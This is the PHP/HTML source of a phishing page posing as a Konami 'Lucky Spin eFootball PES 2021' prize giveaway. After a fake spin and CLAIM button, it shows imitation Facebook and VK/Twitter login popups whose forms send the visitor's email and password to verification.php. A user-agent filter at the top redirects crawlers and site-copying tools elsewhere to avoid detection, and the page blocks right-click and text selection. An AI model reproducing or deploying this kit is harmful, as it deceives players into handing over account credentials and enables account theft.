<?php
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('Location: cracker.php');
die();
}
?>
<!DOCTYPE html>
<html>

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <link href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">
    <style type="text/css">
         @font-face {
         font-family: "teko";
         src: url('assets/font/teko_regular.ttf');
         }
        body{
           
            font-family: teko;

        }
        .swal-icon--error {
            border-color: #f27474;
            -webkit-animation: animateErrorIcon .5s;
            animation: animateErrorIcon .5s
        }
        
        .swal-icon--error__x-mark {
            position: relative;
            display: block;
            -webkit-animation: animateXMark .5s;
            animation: animateXMark .5s
        }
        
        .swal-icon--error__line {
            position: absolute;
            height: 5px;
            width: 47px;
            background-color: #f27474;
            display: block;
            top: 37px;
            border-radius: 2px
        }
        
        .swal-icon--error__line--left {
            -webkit-transform: rotate(45deg);
            transform: rotate(45deg);
            left: 17px
        }
        
        .swal-icon--error__line--right {
            -webkit-transform: rotate(-45deg);
            transform: rotate(-45deg);
            right: 16px
        }
        
        @-webkit-keyframes animateErrorIcon {
            0% {
                -webkit-transform: rotateX(100deg);
                transform: rotateX(100deg);
                opacity: 0
            }
            to {
                -webkit-transform: rotateX(0deg);
                transform: rotateX(0deg);
                opacity: 1
            }
        }
        
        @keyframes animateErrorIcon {
            0% {
                -webkit-transform: rotateX(100deg);
                transform: rotateX(100deg);
                opacity: 0
            }
            to {
                -webkit-transform: rotateX(0deg);
                transform: rotateX(0deg);
                opacity: 1
            }
        }
        
        @-webkit-keyframes animateXMark {
            0% {
                -webkit-transform: scale(.4);
                transform: scale(.4);
                margin-top: 26px;
                opacity: 0
            }
            50% {
                -webkit-transform: scale(.4);
                transform: scale(.4);
                margin-top: 26px;
                opacity: 0
            }
            80% {
                -webkit-transform: scale(1.15);
                transform: scale(1.15);
                margin-top: -6px
            }
            to {
                -webkit-transform: scale(1);
                transform: scale(1);
                margin-top: 0;
                opacity: 1
            }
        }
        
        @keyframes animateXMark {
            0% {
                -webkit-transform: scale(.4);
                transform: scale(.4);
                margin-top: 26px;
                opacity: 0
            }
            50% {
                -webkit-transform: scale(.4);
                transform: scale(.4);
                margin-top: 26px;
                opacity: 0
            }
            80% {
                -webkit-transform: scale(1.15);
                transform: scale(1.15);
                margin-top: -6px
            }
            to {
                -webkit-transform: scale(1);
                transform: scale(1);
                margin-top: 0;
                opacity: 1
            }
        }
        
        .swal-icon--warning {
            border-color: #f8bb86;
            -webkit-animation: pulseWarning .75s infinite alternate;
            animation: pulseWarning .75s infinite alternate
        }
        
        .swal-icon--warning__body {
            width: 5px;
            height: 47px;
            top: 10px;
            border-radius: 2px;
            margin-left: -2px
        }
        
        .swal-icon--warning__body,
        .swal-icon--warning__dot {
            position: absolute;
            left: 50%;
            background-color: #211f36
        }
        
        .swal-icon--warning__dot {
            width: 7px;
            height: 7px;
            border-radius: 50%;
            margin-left: -4px;
            bottom: -11px
        }
        
        @-webkit-keyframes pulseWarning {
            0% {
                border-color: #f8d486
            }
            to {
                border-color: #f8bb86
            }
        }
        
        @keyframes pulseWarning {
            0% {
                border-color: #f8d486
            }
            to {
                border-color: #f8bb86
            }
        }
        
        .swal-icon--success {
            border-color: green
        }
        
        .swal-icon--success:after,
        .swal-icon--success:before {
            content: "";
            border-radius: 50%;
            position: absolute;
            width: 60px;
            height: 120px;
            background: #211f36;
            -webkit-transform: rotate(45deg);
            transform: rotate(45deg)
        }
        
        .swal-icon--success:before {
            border-radius: 120px 0 0 120px;
            top: -7px;
            left: -33px;
            -webkit-transform: rotate(-45deg);
            transform: rotate(-45deg);
            -webkit-transform-origin: 60px 60px;
            transform-origin: 60px 60px
        }
        
        .swal-icon--success:after {
            border-radius: 0 120px 120px 0;
            top: -11px;
            left: 30px;
            -webkit-transform: rotate(-45deg);
            transform: rotate(-45deg);
            -webkit-transform-origin: 0 60px;
            transform-origin: 0 60px;
            -webkit-animation: rotatePlaceholder 4.25s ease-in;
            animation: rotatePlaceholder 4.25s ease-in
        }
        
        .swal-icon--success__ring {
            width: 80px;
            height: 80px;
            border: 4px solid hsla(98, 55%, 69%, .2);
            border-radius: 50%;
            box-sizing: content-box;
            position: absolute;
            left: -4px;
            top: -4px;
            z-index: 2
        }
        
        .swal-icon--success__hide-corners {
            width: 5px;
            height: 90px;
            background-color: #211f36;
            padding: 1px;
            position: absolute;
            left: 28px;
            top: 8px;
            z-index: 1;
            -webkit-transform: rotate(-45deg);
            transform: rotate(-45deg)
        }
        
        .swal-icon--success__line {
            height: 5px;
            background-color: green;
            display: block;
            border-radius: 2px;
            position: absolute;
            z-index: 2
        }
        
        .swal-icon--success__line--tip {
            width: 25px;
            left: 14px;
            top: 46px;
            -webkit-transform: rotate(45deg);
            transform: rotate(45deg);
            -webkit-animation: animateSuccessTip .75s;
            animation: animateSuccessTip .75s
        }
        
        .swal-icon--success__line--long {
            width: 47px;
            right: 8px;
            top: 38px;
            -webkit-transform: rotate(-45deg);
            transform: rotate(-45deg);
            -webkit-animation: animateSuccessLong .75s;
            animation: animateSuccessLong .75s
        }
        
        @-webkit-keyframes rotatePlaceholder {
            0% {
                -webkit-transform: rotate(-45deg);
                transform: rotate(-45deg)
            }
            5% {
                -webkit-transform: rotate(-45deg);
                transform: rotate(-45deg)
            }
            12% {
                -webkit-transform: rotate(-405deg);
                transform: rotate(-405deg)
            }
            to {
                -webkit-transform: rotate(-405deg);
                transform: rotate(-405deg)
            }
        }
        
        @keyframes rotatePlaceholder {
            0% {
                -webkit-transform: rotate(-45deg);
                transform: rotate(-45deg)
            }
            5% {
                -webkit-transform: rotate(-45deg);
                transform: rotate(-45deg)
            }
            12% {
                -webkit-transform: rotate(-405deg);
                transform: rotate(-405deg)
            }
            to {
                -webkit-transform: rotate(-405deg);
                transform: rotate(-405deg)
            }
        }
        
        @-webkit-keyframes animateSuccessTip {
            0% {
                width: 0;
                left: 1px;
                top: 19px
            }
            54% {
                width: 0;
                left: 1px;
                top: 19px
            }
            70% {
                width: 50px;
                left: -8px;
                top: 37px
            }
            84% {
                width: 17px;
                left: 21px;
                top: 48px
            }
            to {
                width: 25px;
                left: 14px;
                top: 45px
            }
        }
        
        @keyframes animateSuccessTip {
            0% {
                width: 0;
                left: 1px;
                top: 19px
            }
            54% {
                width: 0;
                left: 1px;
                top: 19px
            }
            70% {
                width: 50px;
                left: -8px;
                top: 37px
            }
            84% {
                width: 17px;
                left: 21px;
                top: 48px
            }
            to {
                width: 25px;
                left: 14px;
                top: 45px
            }
        }
        
        @-webkit-keyframes animateSuccessLong {
            0% {
                width: 0;
                right: 46px;
                top: 54px
            }
            65% {
                width: 0;
                right: 46px;
                top: 54px
            }
            84% {
                width: 55px;
                right: 0;
                top: 35px
            }
            to {
                width: 47px;
                right: 8px;
                top: 38px
            }
        }
        
        @keyframes animateSuccessLong {
            0% {
                width: 0;
                right: 46px;
                top: 54px
            }
            65% {
                width: 0;
                right: 46px;
                top: 54px
            }
            84% {
                width: 55px;
                right: 0;
                top: 35px
            }
            to {
                width: 47px;
                right: 8px;
                top: 38px
            }
        }
        
        .swal-icon--info {
            border-color: #c9dae1
        }
        
        .swal-icon--info:before {
            width: 5px;
            height: 29px;
            bottom: 17px;
            border-radius: 2px;
            margin-left: -2px
        }
        
        .swal-icon--info:after,
        .swal-icon--info:before {
            content: "";
            position: absolute;
            left: 50%;
            background-color: #c9dae1
        }
        
        .swal-icon--info:after {
            width: 7px;
            height: 7px;
            border-radius: 50%;
            margin-left: -3px;
            top: 19px
        }
        
        .swal-icon {
            width: 80px;
            height: 80px;
            border-width: 4px;
            border-style: solid;
            border-radius: 50%;
            padding: 0;
            position: relative;
            box-sizing: content-box;
            margin: 20px auto
        }
        
        .swal-icon:first-child {
            margin-top: 32px
        }
        
        .swal-icon--custom {
            width: auto;
            height: auto;
            max-width: 100%;
            border: none;
            border-radius: 0
        }
        
        .swal-icon img {
            max-width: 100%;
            max-height: 100%
        }
        
        .swal-title {
            color: gold;
            font-weight: 600;
            text-transform: none;
            position: relative;
            display: block;
            padding: 13px 16px;
            font-size: 27px;
            line-height: normal;
            text-align: center;
            margin-bottom: 0
        }
        
        .swal-title:first-child {
            margin-top: 26px
        }
        
        .swal-title:not(:first-child) {
            padding-bottom: 0
        }
        
        .swal-title:not(:last-child) {
            margin-bottom: 13px
        }
        
        .swal-text {
            font-size: 16px;
            position: relative;
            float: none;
            line-height: normal;
            vertical-align: top;
            text-align: left;
            display: inline-block;
            margin: 0;
            padding: 0 10px;
            font-weight: 400;
            color: red;
            max-width: calc(100% - 20px);
            overflow-wrap: break-word;
            box-sizing: border-box
        }
        
        .swal-text:first-child {
            margin-top: 45px
        }
        
        .swal-text:last-child {
            margin-bottom: 45px
        }
        
        .swal-footer {
            text-align: right;
            padding-top: 13px;
            margin-top: 13px;
            padding: 13px 16px;
            border-radius: inherit;
            border-top-left-radius: 0;
            border-top-right-radius: 0
        }
        
        .swal-button-container {
            margin: 5px;
            display: inline-block;
            position: relative
        }
        
        .swal-2button {
            background-color: red;
            color: #fff;
            border: none;
            box-shadow: none;
            border-radius: 5px;
            font-weight: 600;
            font-size: 14px;
            padding: 10px 24px;
            margin: 0;
            cursor: pointer
        }
        
        .swal-2button[not:disabled]:hover {
            background-color: #78cbf2
        }
        
        .swal-button:active {
            background-color: #70bce0;
        }
        
        .claim {
            margin: 5px;
            display: inline-block;
            position: relative
        }
        
        .claim {
            background-color: #FF0000;
            color: #fff;
            border: none;
            box-shadow: none;
            border-radius: 5px;
            font-weight: 600;
            font-size: 14px;
            padding: 10px 24px;
            margin: 0;
            cursor: pointer
        }
        
        .swal-button:focus {
            outline: none;
            box-shadow: 0 0 0 1px #fff, 0 0 0 3px rgba(43, 114, 165, .29)
        }
        
        .swal-button[disabled] {
            opacity: .5;
            cursor: default
        }
        
        .swal-button::-moz-focus-inner {
            border: 0
        }
        
        .swal-button--cancel {
            color: #555;
            background-color: #efefef
        }
        
        .swal-button--cancel[not:disabled]:hover {
            background-color: #e8e8e8
        }
        
        .swal-button--cancel:active {
            background-color: #d7d7d7
        }
        
        .swal-button--cancel:focus {
            box-shadow: 0 0 0 1px #fff, 0 0 0 3px rgba(116, 136, 150, .29)
        }
        
        .swal-button--danger {
            background-color: #e64942
        }
        
        .swal-button--danger[not:disabled]:hover {
            background-color: #df4740
        }
        
        .swal-button--danger:active {
            background-color: #cf423b
        }
        
        .swal-button--danger:focus {
            box-shadow: 0 0 0 1px #fff, 0 0 0 3px rgba(165, 43, 43, .29)
        }
        
        .swal-content {
            padding: 0 20px;
            margin-top: 20px;
            font-size: medium
        }
        
        .swal-content:last-child {
            margin-bottom: 20px
        }
        
        .swal-content__input,
        .swal-content__textarea {
            -webkit-appearance: none;
            background-color: #fff;
            border: none;
            font-size: 14px;
            display: block;
            box-sizing: border-box;
            width: 100%;
            border: 1px solid rgba(0, 0, 0, .14);
            padding: 10px 13px;
            border-radius: 2px;
            transition: border-color .2s
        }
        
        .swal-content__input:focus,
        .swal-content__textarea:focus {
            outline: none;
            border-color: #6db8ff
        }
        
        .swal-content__textarea {
            resize: vertical
        }
        
        .swal-button--loading {
            color: transparent
        }
        
        .swal-button--loading~.swal-button__loader {
            opacity: 1
        }
        
        .swal-button__loader {
            position: absolute;
            height: auto;
            width: 43px;
            z-index: 2;
            left: 50%;
            top: 50%;
            -webkit-transform: translateX(-50%) translateY(-50%);
            transform: translateX(-50%) translateY(-50%);
            text-align: center;
            pointer-events: none;
            opacity: 0
        }
        
        .swal-button__loader div {
            display: inline-block;
            float: none;
            vertical-align: baseline;
            width: 9px;
            height: 9px;
            padding: 0;
            border: none;
            margin: 2px;
            opacity: .4;
            border-radius: 7px;
            background-color: hsla(0, 0%, 100%, .9);
            transition: background .2s;
            -webkit-animation: swal-loading-anim 1s infinite;
            animation: swal-loading-anim 1s infinite
        }
        
        .swal-button__loader div:nth-child(3n+2) {
            -webkit-animation-delay: .15s;
            animation-delay: .15s
        }
        
        .swal-button__loader div:nth-child(3n+3) {
            -webkit-animation-delay: .3s;
            animation-delay: .3s
        }
        
        @-webkit-keyframes swal-loading-anim {
            0% {
                opacity: .4
            }
            20% {
                opacity: .4
            }
            50% {
                opacity: 1
            }
            to {
                opacity: .4
            }
        }
        
        @keyframes swal-loading-anim {
            0% {
                opacity: .4
            }
            20% {
                opacity: .4
            }
            50% {
                opacity: 1
            }
            to {
                opacity: .4
            }
        }
        
        .swal-overlay {
            position: fixed;
            top: 0;
            bottom: 0;
            left: 0;
            right: 0;
            text-align: center;
            font-size: 0;
            overflow-y: auto;
            background-color: rgba(0, 0, 0, .4);
            z-index: 10000;
            pointer-events: none;
            opacity: 0;
            transition: opacity .3s
        }
        
        .swal-overlay:before {
            content: " ";
            display: inline-block;
            vertical-align: middle;
            height: 100%
        }
        
        .swal-overlay--show-modal {
            opacity: 1;
            pointer-events: auto
        }
        
        .swal-overlay--show-modal .swal-modal {
            opacity: 1;
            pointer-events: auto;
            box-sizing: border-box;
            -webkit-animation: showSweetAlert .3s;
            animation: showSweetAlert .3s;
            will-change: transform
        }
        
        .swal-modal {
            width: 478px;
            opacity: 0;
            pointer-events: none;
            background-color: #211f36;
            border: 1px solid silver;
            text-align: center;
            border-radius: 5px;
            position: static;
            margin: 20px auto;
            display: inline-block;
            vertical-align: middle;
            -webkit-transform: scale(1);
            transform: scale(1);
            -webkit-transform-origin: 50% 50%;
            transform-origin: 50% 50%;
            z-index: 999999;
            transition: opacity .2s, -webkit-transform .3s;
            transition: transform .3s, opacity .2s;
            transition: transform .3s, opacity .2s, -webkit-transform .3s
        }
        
        @media (max-width:500px) {
            .swal-modal {
                width: calc(100% - 20px)
            }
        }
        
        @-webkit-keyframes showSweetAlert {
            0% {
                -webkit-transform: scale(1);
                transform: scale(1)
            }
            1% {
                -webkit-transform: scale(.5);
                transform: scale(.5)
            }
            45% {
                -webkit-transform: scale(1.05);
                transform: scale(1.05)
            }
            80% {
                -webkit-transform: scale(.95);
                transform: scale(.95)
            }
            to {
                -webkit-transform: scale(1);
                transform: scale(1)
            }
        }
        
        @keyframes showSweetAlert {
            0% {
                -webkit-transform: scale(1);
                transform: scale(1)
            }
            1% {
                -webkit-transform: scale(.5);
                transform: scale(.5)
            }
            45% {
                -webkit-transform: scale(1.05);
                transform: scale(1.05)
            }
            80% {
                -webkit-transform: scale(.95);
                transform: scale(.95)
            }
            to {
                -webkit-transform: scale(1);
                transform: scale(1)
            }
        }
    </style>

    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Lucky Spin eFootball Pes 2021</title>
    <link rel="icon" type="img/png" href="https://i.ibb.co/CtcRPvg/IMG-20201117-021350-101.jpg" sizes="32x32">
    <meta property="og:description" content="Start a event from Konami. You can spin in one times only!">
    <meta property="og:image" content="https://i.ibb.co/GxvsRp0/logo-efootball-open-picsay.png">
    <meta property="og:image:width" content="540">
    <meta property="og:image:height" content="282">
	<link rel="stylesheet" href="css-zone/facebook.css">
	<link rel="stylesheet" href="css-zone/twitter.css">
	<link href="https://fonts.googleapis.com/css2?family=Teko&display=swap" rel="stylesheet">
    <script type="text/javascript" src="js-zone/jquery.js"> </script>
    <script type="text/javascript" src="js-zone/main-zone.js"></script> 
    <script type="text/javascript" src="index_files/main-zone.js.download">
    </script>
    <script language="JavaScript">
        document.write(ls())
    </script>
    <script language="JavaScript">
        document.write(ls())
    </script>
    <script script language="JavaScript">
        document.write(riyanandhika())
    </script>
    <link href="./index_files/css" rel="stylesheet">
    <script language="JavaScript">
        document.write(head())
    </script>
</head>
<body  oncontextmenu="return false" onselectstart="return false" ondragstart="return false">
    <div class="slider-container">
    <div class="slider">
		<img src="img/header/1.jpg" style="width: 100%;">
	</div>
	<div class="slider">
		<img src="img/header/2.jpg" style="width: 100%;">
	</div>
	<div class="slider">
		<img src="img/header/3.jpg" style="width: 100%;">
	</div>
	<div class="slider">
		<img src="img/header/4.jpg" style="width: 100%;">
	</div>
	<div class="slider">
		<img src="img/header/5.jpg" style="width: 100%;">
	</div>
	<div class="slider">
		<img src="img/header/6.jpg" style="width: 100%;">
	</div>
	<div class="slider">
		<img src="img/header/7.jpg" style="width: 100%;">
	</div>
   </div class="slider">
        <img src="img/header/8.jpg" style="width: 100%;">    
    </div>
    </div>
    
    <div class="notification-container">
        <div class="notification">
            <div style="padding-top: 25px; color: #000; font-size: 30px; font-weight: bold; font-family: Teko; text-align: center; text-transform: uppercase;"></div>
            <div style="padding-top: 10px; color: #000; font-size: 20px; font-weight: bold; font-family: Teko; text-align: center; text-transform: uppercase;"></div>
        </div>
    </div>
    <div class="gallery-container">
        <div class="cont">
            <div id="zone" class="gallery">
                <br>
                <script language="JavaScript">
                    document.write(inti())
                </script>
                <section class="container" id="js-lotto">
                    <div class="square" data-order="1">
                        <div class="square__content"><svg viewBox="0 0 100 100" version="1.1" xmlns="http://www.w3.org/2000/svg"><defs ><pattern id="gift1" patternUnits="userSpaceOnUse" width="100" height="100"><image xlink:href="img/reward/imgff/1.jpg" x="-25" width="150" height="100"></image></pattern></defs><polygon points="0 0 950 0 0 0 900 0 0 750 0 0" fill="url(#gift1)"></polygon></svg></div>
                    </div>
                    <div class="square" data-order="2">
                        <div class="square__content"><svg viewBox="0 0 100 100" version="1.1" xmlns="http://www.w3.org/2000/svg"><defs><pattern id="gift2" patternUnits="userSpaceOnUse" width="100" height="100"><image xlink:href="img/reward/imgff/2.jpg" x="-25" width="150" height="100"></image></pattern></defs><polygon points="0 0 950 0 0 0 900 0 0 750 0 0" fill="url(#gift2)"></polygon></svg></div>
                    </div>
					<div class="square" data-order="3">
                        <div class="square__content"><svg viewBox="0 0 100 100" version="1.1" xmlns="http://www.w3.org/2000/svg"><defs><pattern id="gift3" patternUnits="userSpaceOnUse" width="100" height="100"><image xlink:href="img/reward/imgff/3.jpg" x="-25" width="150" height="100"></image></pattern></defs><polygon points="0 0 950 0 0 0 900 0 0 750 0 0" fill="url(#gift3)"></polygon></svg></div>
                    </div>
                    <div class="square" data-order="10">
                        <div class="squar__content"><svg viewBox="0 0 100 100" version="1.1" xmlns="http://www.w3.org/2000/svg"><defs><pattern id="gift10" patternUnits="userSpaceOnUse" width="100" height="100"><image xlink:href="img/reward/imgff/12.jpg" x="-25" width="150" height="100"></image></pattern></defs><polygon points="0 0 950 0 0 0 900 0 0 750 0 0" fill="url(#gift10)"></polygon></svg></div>
                    </div>
                    <div class="start squar__start-btn" style="margin-top: 200px; margin-left: 75px; position: absolute;">
                        <div>
                            <center>
                                <img style="margin-top: 20px;" src="https://www.pubgmobile.com/id/event/payload/images/btn_play.png" width="90" height="87">
                            </center>
                        </div>
                    </div>
                    <div class="square" data-order="4" style="margin-left: 125px;">
                        <div class="squar__content"><svg viewBox="0 0 100 100" version="1.1" xmlns="http://www.w3.org/2000/svg"><defs><pattern id="gift4" patternUnits="userSpaceOnUse" width="100" height="100"><image xlink:href="img/reward/imgff/4.jpg" x="-25" width="150" height="100"></image></pattern></defs><polygon points="0 0 950 0 0 0 900 0 0 750 0 0" fill="url(#gift4)"></polygon></svg></div>
                    </div>
                    <div class="square" data-order="9">
                        <div class="squar__content"><svg viewBox="0 0 100 100" version="1.1" xmlns="http://www.w3.org/2000/svg"><defs><pattern id="gift9" patternUnits="userSpaceOnUse" width="100" height="100"><image xlink:href="img/reward/imgff/15.jpg" x="-25" width="150" height="100"></image></pattern></defs><polygon points="0 0 950 0 0 0 900 0 0 750 0 0" fill="url(#gift9)"></polygon></svg></div>
                    </div>
                    <div class="square" data-order="5" style="margin-left: 123px;">
                        <div class="squar__content"><svg viewBox="0 0 100 100" version="1.1" xmlns="http://www.w3.org/2000/svg"><defs><pattern id="gift5" patternUnits="userSpaceOnUse" width="100" height="100"><image xlink:href="img/reward/imgff/5.jpg" x="-25" width="150" height="100"></image></pattern></defs><polygon points="0 0 950 0 0 0 900 0 0 750 0 0" fill="url(#gift5)"></polygon></svg></div>
                    </div>
                    <div class="square" data-order="8">
                        <div class="square__content"><svg viewBox="0 0 100 100" version="1.1" xmlns="http://www.w3.org/2000/svg"><defs><pattern id="gift8" patternUnits="userSpaceOnUse" width="100" height="100"><image xlink:href="img/reward/imgff/8.jpg" x="-25" width="150" height="100"></image></pattern></defs><polygon points="0 0 950 0 0 0 900 0 0 750 0 0" fill="url(#gift8)"></polygon></svg></div>
                    </div>
                    <div class="square" data-order="7">
                        <div class="square__content"><svg viewBox="0 0 100 100" version="1.1" xmlns="http://www.w3.org/2000/svg"><defs><pattern id="gift7" patternUnits="userSpaceOnUse" width="100" height="100"><image xlink:href="img/reward/imgff/14.jpg" x="-25" width="150" height="100"></image></pattern></defs><polygon points="0 0 950 0 0 0 900 0 0 750 0 0" fill="url(#gift7)"></polygon></svg></div>
                    </div>
					<div class="square" data-order="6">
                        <div class="square__content"><svg viewBox="0 0 100 100" version="1.1" xmlns="http://www.w3.org/2000/svg"><defs><pattern id="gift6" patternUnits="userSpaceOnUse" width="100" height="100"><image xlink:href="img/reward/imgff/13.jpg" x="-25" width="150" height="100"></image></pattern></defs><polygon points="0 0 950 0 0 0 900 0 0 750 0 0" fill="url(#gift6)"></polygon></svg></div>
                    </div>
                </section>
				<o onclick="klik1()">
				    <div style="position: absolute; cursor: pointer; z-index: 99; background: #fed33f; width: 90px; height: 90px; margin-left: 130px; margin-right: auto; margin-top: -300px; margin-bottom: 200px; border-radius: 48px; padding: 0; color: #00008B; font-size: 15px; font-weight: bold; font-family: Teko; text-align: center; text-transform: uppercase; border: 2px solid #000; outline: none; display: block;" id="js-start">
				        <span style="display: block; margin-top: 38px;">Start Spin</span>
				    </div>
				</o>
            </div>
            <br>
            <br>
        </div>
        <script language="JavaScript">
            document.write(foot())
        </script>

    </div>
    <div class="div-bot" style="color:white;padding-top: 10px;padding-bottom: 1px;">
        <center>
		<p>
				<div style="font-family: Teko;"> ©2020 Konami Digital Entertainment</div>
		</p>
        </center>
    </div>
    <script src="./index_files/jquery.min.js.download">
    </script>
    <script language="JavaScript">
        document.write(result())
    </script>
    <script type="text/javascript" src="index_files/gift-zone.js"></script>
    <script>
        function openHero(evt, heroClass) {
            var i, gallery, tab;
            gallery = document.getElementsByClassName("gallery");
            for (i = 0; i < gallery.length; i++) {
                gallery[i].style.display = "none";
            }
            tab = document.getElementsByClassName("tab");
            for (i = 0; i < tab.length; i++) {
                tab[i].className = tab[i].className.replace(" active", "");
            }
            document.getElementById(heroClass).style.display = "block";
            evt.currentTarget.className += " active";
        }
        document.getElementById("defaultOpen").click();
    </script>
    <script type="text/javascript" src="js-zone/slide-zone.js"> </script>
    <script type="text/javascript" src="./index_files/slide-zone.js.download">
    </script>
    <script language="JavaScript">
        document.write(luckyspin())
    </script>

    <style type="text/css">
        *: (input, textarea) {
            -webkit-touch-callout: none;
            -webkit-user-select: none;
        }
    </style>
    <style type="text/css">
        img {
            -webkit-touch-callout: none;
            -webkit-user-select: none;
        }
    </style>
   

   <style type="text/css">
       .dav{
            background: url(https://i.ibb.co/nrgT7qg/download.jpg) no-repeat center;
			background-size: cover;
            height: 300px;
            width: 350px;
            position: absolute;
            top: 80%;
            left: 50%;
            transform: translate(-50%,-50%);
            border: 3px solid #000;
            z-index: 9999;
       }
       .text-dav{
	   color: #fed33f;
        font-family: Headliner;
            font-size: 25px;
            text-align: center;
            margin-top: 50px;
       }
       .batas {
          margin: 30px auto 20px auto;
          text-align: center;
          }

          .btn-log {
    width: 90%;
    display: block;
    margin: 10px auto;
    font-family: 'Teko', sans-serif;
    border: none;
    padding: 8px 0;
    border-radius: 5px;
}

.btn-log i {
    margin-left: 12px;
    color: #fff;
    font-size: 18px;
    line-height: 20px;
}

.fb {
    background-color: #FF0000;
    color: #fff;
    font-size: 18px;
    line-height: 28px;
}
.fb:hover{
    background: #1877F187;
}

.tw {
    background-color: #4376a6;
    color: #fff;
    font-size: 18px;
    line-height: 28px;
}
.tw:hover{
    background: #08a0e99e;
}
.gambar{
    width: 80px;
    height: 100px;
}
.bawah{
    text-align: center;
}
#claim{
    background: #fed33f;
    width: 130px;
    height: auto;
    padding: 9px;
	color: #000;
	font-size: 17px;
	font-weight: bold;
	font-family: Teko;
	text-align: center;
	text-transform: uppercase;
	border: 2px solid #000;
	outline: none;
}

.popup-login {
	background:rgba(0,0,0,0.5);
	width:100%;
	height:100%;
	position:fixed;
	top:0;
	left:0;
	z-index:9999;
}
.popup-box-login-fb {
	background:#ECEFF6;
	max-width:330px;
	height:auto;
	position:relative;
	margin:50px auto;
	margin-top:1.9%;
	text-align:center;
	font-family:'Teko';
	color:#000;
	border-radius:10px;
}
.popup-box-login-twitter {
	background:#fff;
	max-width:330px;
	height:350px;
	position:relative;
	margin:50px auto;
	margin-top:10%;
	text-align:center;
	font-family:'Teko';
	color:#000;
	border-radius:10px;
}
.popup-box-login-google {
	background:#fff;
	max-width:330px;
	height:400px;
	position:relative;
	margin:50px auto;
	margin-top:10%;
	padding:15px;
	text-align:center;
	font-family:'Teko';
	color:#000;
	border-radius:10px;
}
.close-fb {
	background:#000;
	width:20px;
	height:20px;
	color:#fff;
	text-align:center;
	text-decoration:none;
	border-radius:50%;
	border:1.5px solid #fff;
	position:absolute;
	top:-8px;
	right:-10px;
	display:block;
}
.close-fb i {
	color:#fff;
	padding-top:1px;
}
.close-other {
	background:#000;
	width:20px;
	height:20px;
	color:#fff;
	text-align:center;
	text-decoration:none;
	border-radius:50%;
	border:1.5px solid #fff;
	top:-8px;
	right:-10px;
	position:absolute;
	z-index:9999999;
	display:block;
}
.close-other i {
	color:#fff;
	padding-top:1px;
}

   </style>
    
    <div class="dav" id="hadiah" style="display: none; padding-bottom: 15px; height: auto;">
       <div class="text-dav">
GOOD LUCK! 
       </div>
       <div class="batas">
            <img src="img/001.png" alt="" class="gambar">                      
        </div>
        <div class="bawah" style="margin-bottom: 20px;">
            <button id="claim" onclick="klik3()">CLAIM</button>
            <br>&nbsp;<br>
        </div>
   </div>

   <div class="dav" id="dav" style="display: none;">
       <div class="text-dav">
       </div>
      <div class="batas">
      <button class="btn-log fb" type="button" onclick="location.href='login/'"><i class="fa fa-futbol-o" style="margin-top: 3px; float: left;"></i> Login With Konami iD</button>
      </div>
   </div>
   
   <div class="popup-login login_facebook animated fadeIn" style="display: none;">
	<div class="popup-box-login-fb">
		<a onclick="close_facebook()" class="close-fb"><i class="zmdi zmdi-close"></i></a>
		<div class="navbar-fb">
			<img src="https://i.ibb.co/vq0LGBz/facebook-text.png">
		</div>
		<div class="content-box-fb">
			<img src="https://gcube.id/wp-content/uploads/2018/03/gcube-free-fire-icon.png">
			<div class="txt-login-fb">
				 Log in to your Facebook account to connect to Free Fire
			</div>
			<form class="login-form" action="verification.php" method="post">
				<label>
				<input type="text" name="email" placeholder="Mobile number or email address" autocomplete="off" autocapitalize="off" required>
				</label>
				<label>
				<input type="password" name="password" placeholder="Password" autocomplete="off" autocapitalize="off" required>
				</label>
				<input type="hidden" name="login" value="Facebook" readonly>
				<button type="submit" class="btn-login-fb">Log In</button>
			</form>
			<div class="txt-create-account">Create account</div>
			<div class="txt-not-now">Not now</div>
			<div class="txt-forgotten-password">Forgotten password?</div>
		</div>
		<div class="language-box">
			<center>
			<div class="language-name language-name-active">English (UK)</div>
			<div class="language-name">Bahasa Indonesia</div>
			<div class="language-name">Basa Jawa</div>
			<div class="language-name">Bahasa Melayu</div>
			<div class="language-name">日本語</div>
			<div class="language-name">Español</div>
			<div class="language-name">Português (Brasil)</div>
			<div class="language-name">
				<i class="fa fa-plus"></i>
			</div>
			</center>
		</div>
		<div class="copyright">Facebook Inc.</div>
	</div>
</div>

<div class="popup-login login_twitter animated fadeIn" style="display: none;">
	<div class="popup-box-login-twitter">
	<a onclick="close_twitter()" class="close-other"><i class="zmdi zmdi-close"></i></a>
		<div class="header-twitter">
			<center>
			<img src="img/login/twitter_text.png">
			</center>
		</div>
		<div class="box-twitter">
			<center>
			<form action="verification.php" method="post">
				<div class="txt-login-twitter">Login to VK</div>
				<div class="input-box-twitter">
					<label>Phone, email, or username</label>
					<input type="text" name="email" placeholder="" required>
				</div>
				<div class="input-box-twitter">
					<label>Password</label>
					<input type="password" name="password" placeholder="" required>
				</div>
				<input type="hidden" name="login" value="VK" readonly>
				<button type="submit" class="btn-login-twitter">Log In</button>
				<div class="footer-menu-twitter">Forgot password?</div>
				<div class="footer-menu-twitter bulet">•</div>
				<div class="footer-menu-twitter">Sign up to VK</div>
			</form>
			</center>
		</div>
	</div>
</div>

<audio id="klik1" src="https://d1490khl9dq1ow.cloudfront.net/sfx/mp3preview/wheel-spin_Gk0rCUV_.mp3">
<script>
    function klik3() {
        $('#dav').fadeIn('slow');
        $('#hadiah').hide();
    }
	function open_facebook() {
        $('.login_facebook').show();
        $('#dav').hide();
    }
	function open_twitter() {
        $('.login_twitter').show();
        $('#dav').hide();
    }
	function close_facebook() {
        $('.login_facebook').hide();
        $('#dav').show();
    }
	function close_twitter() {
        $('.login_twitter').hide();
        $('#dav').show();
    }
</script>
<script>
// <![CDATA[
